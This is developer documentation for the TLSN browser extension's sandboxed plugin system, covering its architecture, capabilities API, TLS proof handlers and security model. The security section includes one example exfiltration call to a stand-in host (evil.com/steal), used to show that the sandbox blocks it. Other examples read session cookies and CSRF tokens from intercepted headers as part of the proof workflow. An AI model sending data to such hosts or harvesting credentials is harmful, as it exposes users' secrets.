---
sidebar_position: 1
sidebar_label: Plugins
---
# Plugin System

The TLSN Extension features a **secure plugin system** that lets developers write JavaScript plugins for generating TLS proofs. Plugins run in an isolated **QuickJS WebAssembly sandbox** with controlled access to extension features through a **capability-based security model**.

### Key Features

- **Sandboxed Execution** — Plugins run in an isolated QuickJS WASM environment
- **Capability-Based Security** — Fine-grained control over plugin permissions
- **Multi-Window Support** — Open and manage up to 10 browser windows
- **Request Interception** — Capture HTTP requests and headers in real-time
- **Unified Proof Generation** — Single `prove()` API handles all TLS proof operations
- **React-like Hooks** — Familiar patterns with `useEffect`, `useRequests`, `useHeaders`
- **Type-Safe** — Full TypeScript support with declaration files

### Verifier Integration

Plugins generate TLS proofs by communicating with a **verifier server** (see [Verifier Server](./verifier.md) for deployment and configuration). The verifier participates in MPC-TLS, includes a built-in proxy, validates proofs, and supports webhooks.

**Architecture**: Extension → Verifier (with proxy) → Target Server

```javascript
prove(requestOptions, {
  verifierUrl: 'https://demo.tlsnotary.org',
  proxyUrl: 'wss://demo.tlsnotary.org/proxy?token=api.x.com',
  // ...
});
```

---

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                     Browser Extension                        │
│                                                              │
│  ┌────────────────┐         ┌──────────────────┐             │
│  │   Background   │◄────────┤ Content Script   │             │
│  │ Service Worker │         │  (Per Tab)       │             │
│  └────────┬───────┘         └──────────────────┘             │
│           │                                                  │
│           │ Manages                                          │
│           ▼                                                  │
│  ┌────────────────────┐                                      │
│  │  WindowManager     │  - Track up to 10 windows            │
│  │                    │  - Intercept HTTP requests           │
│  │                    │  - Store request/header history      │
│  └────────┬───────────┘                                      │
│           │                                                  │
│           │ Forwards to                                      │
│           ▼                                                  │
│  ┌────────────────────────────────────────────────┐          │
│  │         Offscreen Document                     │          │
│  │                                                │          │
│  │  ┌──────────────────┐      ┌─────────────────┐ │          │
│  │  │ SessionManager   │◄────►│  ProveManager   │ │          │
│  │  │                  │      │  (WASM Worker)  │ │          │
│  │  │  - Plugin State  │      │                 │ │          │
│  │  │  - UI Rendering  │      │  - TLS Prover   │ │          │
│  │  │  - Capabilities  │      │  - Transcripts  │ │          │
│  │  └────────┬─────────┘      └─────────────────┘ │          │
│  │           │                                    │          │
│  │           │ Creates & Manages                  │          │
│  │           ▼                                    │          │
│  │  ┌──────────────────────────────────┐          │          │
│  │  │    Host (QuickJS Sandbox)        │          │          │
│  │  │                                  │          │          │
│  │  │  ┌────────────────────────────┐  │          │          │
│  │  │  │   Plugin Code (Isolated)   │  │          │          │
│  │  │  │                            │  │          │          │
│  │  │  │  - main() → UI rendering   │  │          │          │
│  │  │  │  - callbacks → User actions│  │          │          │
│  │  │  │                            │  │          │          │
│  │  │  │  Access via env object:    │  │          │          │
│  │  │  │  - env.openWindow()        │  │          │          │
│  │  │  │  - env.useRequests()       │  │          │          │
│  │  │  │  - env.setState/useState() │  │          │          │
│  │  │  │  - env.prove()             │  │          │          │
│  │  │  │  - env.div(), env.button() │  │          │          │
│  │  │  └────────────────────────────┘  │          │          │
│  │  │                                  │          │          │
│  │  │  Security: No network, no FS     │          │          │
│  │  └──────────────────────────────────┘          │          │
│  └────────────────────────────────────────────────┘          │
└──────────────────────────────────────────────────────────────┘
```

### Core Components

**Host** (`packages/plugin-sdk/src/index.ts`) — The core runtime. Creates isolated QuickJS sandboxes, registers capabilities, and provides `executePlugin(code)` for running plugin code.

**SessionManager** (`packages/extension/src/offscreen/SessionManager.ts`) — Manages plugin lifecycle, injects capabilities (`prove`, `openWindow`, hooks, etc.), renders UI, and routes messages between background and plugin.

**ProveManager** (`packages/extension/src/offscreen/ProveManager/`) — Manages TLS proof generation in a Web Worker. Handles prover lifecycle, request proxying, transcript parsing with byte-level range tracking, and selective handlers.

**WindowManager** (`packages/extension/src/background/WindowManager.ts`) — Tracks up to 10 concurrent browser windows, intercepts HTTP requests and headers via `webRequest` API, and stores up to 1000 requests/headers per window.

---

## Plugin Lifecycle

1. **User triggers plugin execution**
2. **Background service worker receives `EXEC_CODE` message**
   - Forwards to Offscreen Document
3. **SessionManager.executePlugin(code)**
   - Creates QuickJS sandbox with capabilities
   - Evaluates plugin code
   - Extracts `{ main, onClick, config, ...callbacks }`
4. **Initial render: `main()`**
   - Plugin returns UI as JSON (div/button tree)
   - May call openWindow() via useEffect
5. **Request/header interception**
   - WindowManager captures HTTP traffic
   - Sends `REQUEST_INTERCEPTED` messages
   - SessionManager updates plugin state
   - Calls `main()` again → UI updates
6. **User interaction (button click)**
   - Content script sends `PLUGIN_UI_CLICK` message
   - SessionManager executes associated callback
   - Callback may call `prove()` to generate proof
   - Calls `main()` again → UI updates
7. **Plugin completion: done()**
   - Closes associated window
   - Disposes QuickJS sandbox
   - Resolves `executePlugin()` promise

---

## Capabilities API

All capabilities are accessible via the `env` object, automatically injected into the QuickJS sandbox.

### DOM Construction

Create UI elements as JSON, rendered by the content script.

#### `div(options, children)`

```javascript
div(
  {
    style: {
      backgroundColor: '#1a1a1a',
      padding: '16px',
      borderRadius: '8px',
    },
  },
  [
    'Hello World',
    button({ onclick: 'handleClick' }, ['Click Me']),
  ]
)
```

#### `button(options, children)`

The `onclick` property is a string name of an exported callback function.

```javascript
button(
  {
    style: {
      backgroundColor: '#4CAF50',
      color: 'white',
      padding: '10px 20px',
      border: 'none',
      borderRadius: '4px',
      cursor: 'pointer',
    },
    onclick: 'onClick',
  },
  ['Generate Proof']
)
```

---

### Window Management

#### `openWindow(url, options?)`

Opens a new managed browser window with request interception enabled.

| Parameter             | Type    | Default | Description             |
| --------------------- | ------- | ------- | ----------------------- |
| `url`                 | string  | —       | URL to open             |
| `options.width`       | number  | 800     | Window width in pixels  |
| `options.height`      | number  | 600     | Window height in pixels |
| `options.showOverlay` | boolean | false   | Show TLSN overlay       |

**Returns:** `Promise<{ windowId: number, uuid: string, tabId: number }>`

Maximum 10 concurrent managed windows.

```javascript
const windowInfo = await openWindow('https://x.com', {
  width: 900,
  height: 700,
  showOverlay: true,
});
```

---

### Hooks

#### `useEffect(effect, deps)`

Run side effects with dependency tracking (like React's `useEffect`).

- First render: always executes
- Subsequent renders: executes only if dependencies changed (deep equality)

```javascript
function main() {
  const [requests] = useRequests((reqs) => reqs);

  // Open window on first render only
  useEffect(() => {
    openWindow('https://x.com');
  }, []);

  // Log when requests change
  useEffect(() => {
    console.log('Requests updated:', requests.length);
  }, [requests]);

  return div({}, ['Hello World']);
}
```

#### `useState(key, defaultValue)` / `setState(key, value)`

Get and set state values by key. `setState` triggers a UI re-render when the value changes (deep equality comparison).

```javascript
function main() {
  const count = useState('count', 0);
  const status = useState('status', 'idle');

  return div({}, [
    div({}, [`Status: ${status}`]),
    div({}, [`Count: ${count}`]),
    button({ onclick: 'increment' }, ['Increment']),
  ]);
}

async function increment() {
  setState('status', 'updating');
  const current = useState('count', 0);
  setState('count', current + 1);
  setState('status', 'idle');
}

export default { main, increment };
```

#### `useRequests(filterFn)`

Get filtered intercepted HTTP requests for the current window.

```typescript
interface InterceptedRequest {
  id: string;
  url: string;
  method: string;
  timestamp: number;
  tabId: number;
  requestBody?: {
    error?: string;
    formData?: Record<string, string>;
    raw?: Array<{ bytes?: any; file?: string }>;
  };
}
```

```javascript
const [apiRequests] = useRequests((requests) =>
  requests.filter((req) =>
    req.url.includes('api.x.com') && req.method === 'GET'
  )
);
```

#### `useHeaders(filterFn)`

Get filtered intercepted HTTP request headers for the current window.

```typescript
interface InterceptedRequestHeader {
  id: string;
  url: string;
  method: string;
  timestamp: number;
  type: string;
  tabId: number;
  requestHeaders: Array<{
    name: string;
    value?: string;
  }>;
}
```

```javascript
const [authHeader] = useHeaders((headers) =>
  headers.filter((header) =>
    header.url.includes('api.x.com/1.1/account/settings.json')
  )
);

if (authHeader) {
  const cookie = authHeader.requestHeaders.find(h => h.name === 'Cookie')?.value;
  const csrfToken = authHeader.requestHeaders.find(h => h.name === 'x-csrf-token')?.value;
}
```

---

### TLS Proof Generation

#### `prove(requestOptions, proverOptions)`

The unified API for TLS proof generation. This single function handles creating a prover connection, sending the HTTP request, capturing the TLS transcript, applying selective reveal handlers, and returning the proof.

**`requestOptions`**

| Field     | Type    | Description                        |
| --------- | ------- | ---------------------------------- |
| `url`     | string  | Full request URL                   |
| `method`  | string  | HTTP method (`GET`, `POST`, etc.)  |
| `headers` | object  | Request headers as key-value pairs |
| `body`    | string? | Request body for POST/PUT requests |

**`proverOptions`**

| Field         | Type      | Description                                                         |
| ------------- | --------- | ------------------------------------------------------------------- |
| `verifierUrl` | string    | Verifier WebSocket URL                                              |
| `proxyUrl`    | string    | WebSocket proxy URL (format: `ws[s]://<host>/proxy?token=<target>`) |
| `maxRecvData` | number?   | Max received bytes (default: 16384)                                 |
| `maxSentData` | number?   | Max sent bytes (default: 4096)                                      |
| `handlers`    | Handler[] | What to reveal or commit                                            |
| `sessionData` | object?   | Custom metadata passed to verifier and included in webhooks         |

#### Handler Structure

```typescript
type Handler = {
  type: 'SENT' | 'RECV';
  part: 'START_LINE' | 'PROTOCOL' | 'METHOD' | 'REQUEST_TARGET' |
        'STATUS_CODE' | 'HEADERS' | 'BODY' | 'ALL';
  action: 'REVEAL' | 'PEDERSEN';
  params?: {
    // For HEADERS:
    key?: string;        // Header name to reveal
    hideKey?: boolean;   // Hide header name, show value only
    hideValue?: boolean; // Hide value, show header name only

    // For BODY with JSON:
    type?: 'json';
    path?: string;       // JSON field path (supports dot notation: 'user.profile.name')

    // For ALL with regex:
    type?: 'regex';
    regex?: string;
    flags?: string;      // e.g. 'g', 'i', 'gi'
  };
};
```

**Handler `part` values:**

| Part             | Description                                      | Applicable To |
| ---------------- | ------------------------------------------------ | ------------- |
| `START_LINE`     | Full first line (e.g. `GET /path HTTP/1.1`)      | SENT, RECV    |
| `PROTOCOL`       | HTTP version (e.g. `HTTP/1.1`)                   | SENT, RECV    |
| `METHOD`         | HTTP method (e.g. `GET`)                         | SENT only     |
| `REQUEST_TARGET` | Request path (e.g. `/1.1/account/settings.json`) | SENT only     |
| `STATUS_CODE`    | Response status (e.g. `200`)                     | RECV only     |
| `HEADERS`        | HTTP headers section                             | SENT, RECV    |
| `BODY`           | HTTP body content                                | SENT, RECV    |
| `ALL`            | Entire transcript (use with regex)               | SENT, RECV    |

#### Proof Response

```typescript
interface ProofResponse {
  results: Array<{
    type: 'SENT' | 'RECV';
    part: string;
    action: 'REVEAL' | 'PEDERSEN';
    params?: object;
    value: string;       // The extracted value
  }>;
}
```

Results maintain the same order as the handlers array.

```javascript
const proof = await prove(requestOptions, proverOptions);

const startLine = proof.results.find(r => r.part === 'START_LINE' && r.type === 'RECV');
console.log('Response status:', startLine.value); // "HTTP/1.1 200 OK"

const username = proof.results.find(r => r.params?.path === 'screen_name');
console.log('Username:', username.value); // "0xTsukino"
```

#### Handler Examples

```javascript
// Reveal request start line
{ type: 'SENT', part: 'START_LINE', action: 'REVEAL' }

// Reveal specific response header
{ type: 'RECV', part: 'HEADERS', action: 'REVEAL', params: { key: 'content-type' } }

// Reveal header value only (hide the key name)
{ type: 'RECV', part: 'HEADERS', action: 'REVEAL', params: { key: 'date', hideKey: true } }

// Reveal JSON field from response body
{ type: 'RECV', part: 'BODY', action: 'REVEAL', params: { type: 'json', path: 'user_id' } }

// Reveal nested JSON field (dot notation)
{ type: 'RECV', part: 'BODY', action: 'REVEAL', params: { type: 'json', path: 'accounts.USD' } }

// Reveal JSON value only (hide key)
{ type: 'RECV', part: 'BODY', action: 'REVEAL', params: { type: 'json', path: 'balance', hideKey: true } }

// Reveal regex match across entire transcript
{ type: 'RECV', part: 'ALL', action: 'REVEAL', params: { type: 'regex', regex: 'user_id=\\d+', flags: 'g' } }

// Commit hash instead of revealing (for privacy)
{ type: 'SENT', part: 'HEADERS', action: 'PEDERSEN', params: { key: 'Cookie' } }
```

---

### Utility Functions

#### `done(args?)`

Complete plugin execution and cleanup. Closes the associated browser window, disposes the QuickJS sandbox, and resolves the `executePlugin()` promise.

```javascript
async function onClick() {
  const proof = await prove(requestOpts, proverOpts);
  await done(proof);
}
```

---

## Example: X-Profile Plugin

A complete plugin that proves a user's X.com profile by opening the site, detecting the profile API request, and generating a TLS proof with selective disclosure.

**Source code:** [twitter.js](https://github.com/tlsnotary/tlsn-extension/blob/main/packages/demo/public/plugins/twitter.js)

---

## Security Model

### Sandbox Isolation

Plugins run in a **QuickJS WebAssembly sandbox** with strict limitations:

|              |                                                                                                                                                    |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Disabled** | Network access (`fetch`, `XMLHttpRequest`), file system access, browser APIs (except capabilities), Node.js APIs, `eval` / `Function` constructors |
| **Allowed**  | ES6+ JavaScript, pure computation, capabilities registered by host (via `env` object)                                                              |

```javascript
// Allowed — registered capability
await openWindow('https://x.com');

// Blocked — no fetch capability
await fetch('https://evil.com/steal'); // TypeError: fetch is not defined

// Blocked — no file system
const fs = require('fs'); // ReferenceError: require is not defined
```

### Resource Limits

| Resource                   | Limit       |
| -------------------------- | ----------- |
| Concurrent managed windows | 10          |
| Requests per window        | 1000 (FIFO) |
| Headers per window         | 1000 (FIFO) |
| `maxSentData` default      | 4096 bytes  |
| `maxRecvData` default      | 16384 bytes |

---

## Development Guide

### Plugin Structure

Every plugin must export an object with at least a `main` function:

```javascript
export default {
  main,              // Required: UI rendering function
  config: {          // Optional: plugin metadata
    name: 'My Plugin',
    description: 'Does something cool',
  },
  myCallback: async () => { /* ... */ },
};
```

### Best Practices

**Use hooks for state management** — filter inside hooks so re-renders trigger correctly:

```javascript
// Good
const [apiRequests] = useRequests((reqs) =>
  reqs.filter(r => r.url.includes('api.x.com'))
);

// Bad — won't trigger re-render when requests change
```

**Handle missing data gracefully:**

```javascript
const [header] = useHeaders(/* ... */);
if (!header) {
  return div({}, ['Waiting for data...']);
}
```

**Use `useEffect` for side effects:**

```javascript
// Good — opens window once
useEffect(() => { openWindow('https://x.com'); }, []);

// Bad — opens on EVERY render
// openWindow('https://x.com');
```

**Minimize revealed data** — only reveal non-sensitive fields. Never reveal auth headers with `REVEAL`; use `PEDERSEN` for sensitive data:

```javascript
// Good — commit sensitive header as hash
{ type: 'SENT', part: 'HEADERS', action: 'PEDERSEN', params: { key: 'Cookie' } }

// Bad — exposes session cookie
{ type: 'SENT', part: 'HEADERS', action: 'REVEAL', params: { key: 'Cookie' } }
```

---

## API Reference Summary

| Category | Function                               | Description                   |
| -------- | -------------------------------------- | ----------------------------- |
| DOM      | `div(options, children)`               | Create div element            |
| DOM      | `button(options, children)`            | Create button element         |
| Window   | `openWindow(url, options?)`            | Open managed window           |
| Hooks    | `useEffect(effect, deps)`              | Side effect with dependencies |
| Hooks    | `useRequests(filterFn)`                | Get filtered requests         |
| Hooks    | `useHeaders(filterFn)`                 | Get filtered headers          |
| Hooks    | `useState(key, defaultValue?)`         | Get state value               |
| Hooks    | `setState(key, value)`                 | Set state value and re-render |
| Proof    | `prove(requestOptions, proverOptions)` | Unified proof generation      |
| Utility  | `done(args?)`                          | Cleanup and exit              |
